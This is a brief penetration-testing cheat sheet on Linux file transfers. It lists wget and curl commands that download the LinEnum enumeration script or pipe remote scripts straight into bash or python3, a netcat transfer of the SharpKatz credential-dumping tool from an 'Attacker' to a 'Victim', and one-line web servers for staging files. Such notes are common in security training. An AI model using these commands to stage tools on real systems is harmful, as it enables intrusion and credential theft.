# Linux File Transfers

***

## Wget

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## Curl

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

## Netcat

Victim:

```bash
nc -l -p 8000 > SharpKatz.exe
```

Attacker:

```bash
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

## Create web server

```bash
python3 -m http.server
```

### Python2.7

```bash
python2.7 -m SimpleHTTPServer
```

### PHP

```bash
php -S 0.0.0.0:8000
```

### Ruby

```bash
ruby -run -ehttpd . -p8000
```
